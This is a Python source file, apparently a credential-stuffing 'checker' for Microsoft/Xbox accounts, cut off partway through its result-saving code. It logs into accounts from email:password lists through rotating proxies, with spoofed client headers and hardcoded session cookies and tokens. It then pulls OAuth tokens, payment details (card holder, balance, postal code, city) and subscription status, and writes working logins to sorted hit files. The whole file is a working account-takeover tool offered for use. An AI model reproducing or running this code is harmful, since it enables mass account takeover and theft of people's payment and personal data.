import re
import uuid
import time
import os
import json
import requests
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, unquote
from threading import Lock
import logging
from colorama import Fore, Style, init as colorama_init

logger = logging.getLogger(__name__)

class XboxChecker:
    def __init__(self, proxy_manager=None):
        self.proxy_manager = proxy_manager
        
    def get_session(self):
        session = requests.Session()
        if self.proxy_manager and self.proxy_manager.has_proxies():
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                session.proxies.update(proxy)
        return session
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "EXPIRED"
            
            date_str = date_str.replace('Z', '+00:00')
            
            try:
                renewal_date = datetime.fromisoformat(date_str)
            except:
                try:
                    renewal_date = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S%z")
                except:
                    try:
                        renewal_date = datetime.strptime(date_str.split('+')[0].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        renewal_date = renewal_date.replace(tzinfo=datetime.now().astimezone().tzinfo)
                    except:
                        return "UNKNOWN"
            
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            
            if remaining < 0:
                return "EXPIRED"
            return str(remaining)
            
        except Exception:
            return "UNKNOWN"
    
    def check(self, email, password):
        try:
            session = self.get_session()
            correlation_id = str(uuid.uuid4())
            
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            r1 = session.get(url1, headers=headers1, timeout=15)
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD"}
            
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}
            
            time.sleep(0.5)
            
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return {"status": "BAD"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                return {"status": "BAD"}
            
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FA", "email": email, "password": password}
            
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED"}
            
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            
            code = code_match.group(1)
            
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD"}
            
            cid = mspcid.upper()
            
            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                            data=token_data, 
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            timeout=15)
            
            if "access_token" not in r4.text:
                return {"status": "BAD"}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": "Bearer " + access_token,
                "X-AnchorMailbox": "CID:" + cid
            }
            
            country = ""
            name = ""
            
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", 
                                headers=profile_headers, timeout=15)
                
                if r5.status_code == 200:
                    profile = r5.json()
                    
                    if "location" in profile and profile["location"]:
                        location_val = profile["location"]
                        if isinstance(location_val, str):
                            country = location_val.split(',')[-1].strip()
                        elif isinstance(location_val, dict):
                            country = location_val.get("country", "")
                    
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
            except:
                pass
            
            time.sleep(0.5)
            
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            
            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            
            payment_token = None
            search_text = r6.text + " " + r6.url
            
            token_patterns = [
                r'access_token=([^&\s"\']+)',
                r'"access_token":"([^"]+)"'
            ]
            
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            
            if not payment_token:
                return {"status": "FREE", "data": {"country": country, "name": name}}
            
            payment_data = {"country": country, "name": name}
            
            correlation_id2 = str(uuid.uuid4())
            
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }
            
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)
                
                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)
                    
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)
                    
                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)
                    
                    zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
                    if zip_match:
                        payment_data['zipcode'] = zip_match.group(1)
                    
                    city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
                    if city_match:
                        payment_data['city'] = city_match.group(1)
            except:
                pass
            
            subscription_data = {}
            
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r8 = session.get(trans_url, headers=payment_headers, timeout=15)
                
                if r8.status_code == 200:
                    response_text = r8.text
                    
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'Xbox Game Pass for Console': 'XBOX GAME PASS CONSOLE',
                        'Xbox Game Pass Core': 'GAME PASS CORE',
                        'Game Pass Core': 'GAME PASS CORE',
                        'Xbox Game Pass': 'GAME PASS',
                        'Game Pass': 'GAME PASS',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'EA Play': 'EA PLAY',
                        'Microsoft 365 Family': 'M365 FAMILY',
                        'Microsoft 365 Personal': 'M365 PERSONAL',
                        'Microsoft 365 Basic': 'M365 BASIC',
                        'Office 365 Home': 'OFFICE 365 HOME',
                        'Office 365 Personal': 'OFFICE 365 PERSONAL',
                        'Minecraft': 'MINECRAFT',
                        'Minecraft Realms': 'MINECRAFT REALMS',
                        'Skype': 'SKYPE',
                    }
                    
                    renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^"]+)"', response_text)
                    
                    if not renewal_match:
                        return {"status": "FREE", "data": payment_data}
                    
                    renewal_date = renewal_match.group(1)
                    days_remaining = self.get_remaining_days(renewal_date)
                    
                    if days_remaining == "EXPIRED":
                        for keyword, type_name in premium_keywords.items():
                            if keyword.lower() in response_text.lower():
                                subscription_data['premium_type'] = type_name
                                break
                        
                        return {"status": "EXPIRED", "data": {**payment_data, **subscription_data, "renewal_date": renewal_date}}
                    
                    has_premium = False
                    premium_type = "UNKNOWN"
                    
                    for keyword, type_name in premium_keywords.items():
                        if keyword.lower() in response_text.lower():
                            has_premium = True
                            premium_type = type_name
                            break
                    
                    if has_premium:
                        subscription_data['premium_type'] = premium_type
                        subscription_data['renewal_date'] = renewal_date
                        subscription_data['days_remaining'] = days_remaining
                        
                        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                        if auto_match:
                            subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                        
                        amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                        if amount_match:
                            subscription_data['total_amount'] = amount_match.group(1)
                        
                        currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                        if currency_match:
                            subscription_data['currency'] = currency_match.group(1)
                        
                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
                    else:
                        return {"status": "FREE", "data": {**payment_data, "renewal_date": renewal_date, "days_remaining": days_remaining}}
                        
            except:
                pass
            
            return {"status": "FREE", "data": payment_data}
            
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except Exception:
            return {"status": "ERROR"}

    def check_v2(self, email, password):
        try:
            session = self.get_session()
            
            HDRPPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
            HDRBK = "1665024852"
            HDRUAID = "a5b22c26bc704002ac309462e8d061bb"
            
            url_login = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(email)}&contextid=2CCDB02DC526CA71&bk={HDRBK}&uaid={HDRUAID}&pid=15216"
            
            payload_template = "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}"
            payload = payload_template.format(ppft=HDRPPFT, email=email, password=password)
            
            headers_login = {
                "Host": "login.live.com",
                "Cache-Control": "max-age=0",
                "sec-ch-ua": "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "https://login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid={HDRUAID}&display=touch&username={quote(email)}",
                "Accept-Language": "en-US,en;q=0.9",
                "Cookie": "CAW=%3CEncryptedData%20xmlns%3D%22http://www.w3.org/2001/04/xmlenc%23%22%20Id%3D%22BinaryDAToken1%22%20Type%3D%22http://www.w3.org/2001/04/xmlenc%23Element%22%3E%3CEncryptionMethod%20Algorithm%3D%22http://www.w3.org/2001/04/xmlenc%23tripledes-cbc%22%3E%3C/EncryptionMethod%3E%3Cds:KeyInfo%20xmlns:ds%3D%22http://www.w3.org/2000/09/xmldsig%23%22%3E%3Cds:KeyName%3Ehttp://Passport.NET/STS%3C/ds:KeyName%3E%3C/ds:KeyInfo%3E%3CCipherData%3E%3CCipherValue%3EM.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ%2BYNEFX7J4eX4arCa69y0j3ebxxB0ET0%2B8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on%2B9vOMIfZZIako5uD3VceGABh7ZxD%2BcwC0ksKgsXzQs9cJFZ%2BG1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA%3D%3D%3C/CipherValue%3E%3C/CipherData%3E%3C/EncryptedData%3E;DIDC=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;DIDCL=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89; OParams=11O.DlK9hYdFfivp*0QoJiYT2Qy83kFNo*ZZTQeuvQ0LQzYIADO3zbs*Hic1wfggJcJ6IjaSW0uhkJA2V2qHoF6Uijtl4S917NbRSYxGy0zbqEYtcXAlWZZCQUyVeRoEZT9xiChsk8JTXV2xPusIXRCRpyflM376GGcjUFMaQZuR6PPITnzwgJTeCj6iMAXKEyR5ougzXlltimdTufqAZLwLiC8a8U2ifLfQXP6ibI2Uk!8vBkegcZ73OpR2J2XPd0XeNEt7zVuUQnsbzmSKT3QetSepbGHhx*bkq8c0KyMZcq08dnJVvcPGwI2NNnN3hI1kytasvECwkKYbPIzVX*cA8jbyVqsQRoGWMTr7gGB4Z5BDteRuWO8tuVBRpn9spWtoBQv5CqOvPptW7kV0n1jrYxU$; MicrosoftApplicationsTelemetryDeviceId=49a10983-52d4-43ed-9a94-14ac360a5683; ai_session=K/6T8kGCWbit7HtaRqLso3|1716398680878|1716398680878; MSFPC=GUID=09547181a6984b52ad37278edb4b6ee6&HASH=0954&LV=202405&V=4&LU=1714868413949"
            }
            
            response_login = session.post(url_login, headers=headers_login, data=payload, allow_redirects=True, timeout=20)
            
            if "Your account or password is incorrect." in response_login.text or "That Microsoft account doesn\\'t exist." in response_login.text:
                return {"status": "BAD"}
            
            if "account.live.com/recover" in response_login.text or "account.live.com/identity/confirm" in response_login.text:
                return {"status": "2FA", "email": email, "password": password}
            
            if "/Abuse?mkt=" in response_login.text:
                return {"status": "BANNED"}
            
            success_cookie = any(cookie.name in ["ANON", "WLSSC"] for cookie in session.cookies)
            if "access_token=" in response_login.url or success_cookie:
                pass
            else:
                return {"status": "BAD"}
            
            oauth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none"
            headers_oauth = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": "https://account.microsoft.com/"
            }
            response_oauth = session.get(oauth_url, headers=headers_oauth, allow_redirects=True, timeout=20)
            
            payment_token = None
            if "access_token=" in response_oauth.url:
                match = re.search(r'access_token=([^&]+)', response_oauth.url)
                if match:
                    payment_token = unquote(match.group(1))
            
            if not payment_token:
                return {"status": "FREE", "data": {"country": "N/A", "name": "N/A"}}
            
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
            }
            
            payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
            response_payment = session.get(payment_url, headers=payment_headers, timeout=15)
            
            payment_data = {"country": "N/A", "name": "N/A"}
            
            if response_payment.status_code == 200:
                text = response_payment.text
                
                balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', text)
                if balance_match:
                    payment_data['balance'] = "$" + balance_match.group(1)
                
                card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', text, re.DOTALL)
                if card_match:
                    payment_data['card_holder'] = card_match.group(1)
                
                country_match = re.search(r'"country"\s*:\s*"([^"]+)"', text)
                if country_match:
                    payment_data['country'] = country_match.group(1)
                
                zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', text)
                if zip_match:
                    payment_data['zipcode'] = zip_match.group(1)
                
                city_match = re.search(r'"city"\s*:\s*"([^"]+)"', text)
                if city_match:
                    payment_data['city'] = city_match.group(1)
            
            subscription_data = {}
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                response_trans = session.get(trans_url, headers=payment_headers, timeout=15)
                
                if response_trans.status_code == 200:
                    trans_text = response_trans.text
                    
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'Xbox Game Pass for Console': 'XBOX GAME PASS CONSOLE',
                        'Xbox Game Pass Core': 'GAME PASS CORE',
                        'Game Pass Core': 'GAME PASS CORE',
                        'Xbox Game Pass': 'GAME PASS',
                        'Game Pass': 'GAME PASS',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'EA Play': 'EA PLAY',
                        'Microsoft 365 Family': 'M365 FAMILY',
                        'Microsoft 365 Personal': 'M365 PERSONAL',
                        'Microsoft 365 Basic': 'M365 BASIC',
                        'Office 365 Home': 'OFFICE 365 HOME',
                        'Office 365 Personal': 'OFFICE 365 PERSONAL',
                        'Minecraft': 'MINECRAFT',
                        'Minecraft Realms': 'MINECRAFT REALMS',
                        'Skype': 'SKYPE',
                    }
                    
                    renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^"]+)"', trans_text)
                    
                    if not renewal_match:
                        return {"status": "FREE", "data": payment_data}
                    
                    renewal_date = renewal_match.group(1)
                    days_remaining = self.get_remaining_days(renewal_date)
                    
                    if days_remaining == "EXPIRED":
                        for keyword, type_name in premium_keywords.items():
                            if keyword.lower() in trans_text.lower():
                                subscription_data['premium_type'] = type_name
                                break
                        return {"status": "EXPIRED", "data": {**payment_data, **subscription_data, "renewal_date": renewal_date}}
                    
                    has_premium = False
                    premium_type = "UNKNOWN"
                    
                    for keyword, type_name in premium_keywords.items():
                        if keyword.lower() in trans_text.lower():
                            has_premium = True
                            premium_type = type_name
                            break
                    
                    if has_premium:
                        subscription_data['premium_type'] = premium_type
                        subscription_data['renewal_date'] = renewal_date
                        subscription_data['days_remaining'] = days_remaining
                        
                        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', trans_text)
                        if auto_match:
                            subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                        
                        amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', trans_text)
                        if amount_match:
                            subscription_data['total_amount'] = amount_match.group(1)
                        
                        currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', trans_text)
                        if currency_match:
                            subscription_data['currency'] = currency_match.group(1)
                        
                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
                    else:
                        return {"status": "FREE", "data": {**payment_data, "renewal_date": renewal_date, "days_remaining": days_remaining}}
            
            except:
                pass
            
            return {"status": "FREE", "data": payment_data}
            
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except Exception:
            return {"status": "ERROR"}

class XboxResultManager:
    def __init__(self, base_folder=None):
        if base_folder is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            base_folder = f"results/xbox_{timestamp}"
        
        self.base_folder = base_folder
        Path(self.base_folder).mkdir(parents=True, exist_ok=True)
        
        self.premium_file = os.path.join(self.base_folder, "Premium.txt")
        self.free_file = os.path.join(self.base_folder, "Free.txt")
        self.expired_file = os.path.join(self.base_folder, "Expired.txt")
        self.twofa_file = os.path.join(self.base_folder, "TwoFactor.txt")
        self.banned_file = os.path.join(self.base_folder, "Banned.txt")
        
        self.counts = {
            'premium_all': 0,
            'free': 0,
            'expired': 0,
            'twofa': 0,
            'banned': 0,
        }
    
    def save_result(self, email, password, result):
        status = result['status']
        data = result.get('data', {})
        line = f"{email}:{password}"
        
        def format_hit(extra=""):
            return f"{line} | {extra}\n"
        
        if status == "PREMIUM":
            ptype = data.get('premium_type', 'UNKNOWN')
            country = data.get('country', 'N/A')
            days = data.get('days_remaining', '0')
            renew = data.get('renewal_date', 'N/A')
            auto = data.get('auto_renew', 'NO')
            card = data.get('card_holder', '')
            balance = data.get('balance', '')
            extra = f"Type: {ptype} | Country: {country} | Days: {days} | Renew: {renew} | Auto: {auto}"
            if card:
                extra += f" | Card: {card}"
            if balance and balance != "$0.0":
                extra += f" | Balance: {balance}"
            self.counts['premium_all'] += 1
            with open(self.premium_file, 'a', encoding='utf-8') as f:
                f.write(format_hit(extra))
        
        elif status == "FREE":
            country = data.get('country', 'N/A')
            name = data.get('name', '')
            extra = f"Country: {country}"
            if name:
                extra += f" | Name: {name}"
            if 'card_holder' in data:
                extra += f" | Card: {data['card_holder']}"
            if 'renewal_date' in data:
                extra += f" | Had Renewal: {data['renewal_date']}"
            self.counts['free'] += 1
            with open(self.free_file, 'a', encoding='utf-8') as f:
                f.write(format_hit(extra))
        
        elif status == "EXPIRED":
            ptype = data.get('premium_type', 'UNKNOWN')
            country = data.get('country', 'N/A')
            renew = data.get('renewal_date', 'N/A')
            extra = f"Type: {ptype} (EXPIRED) | Country: {country} | Expired: {renew}"
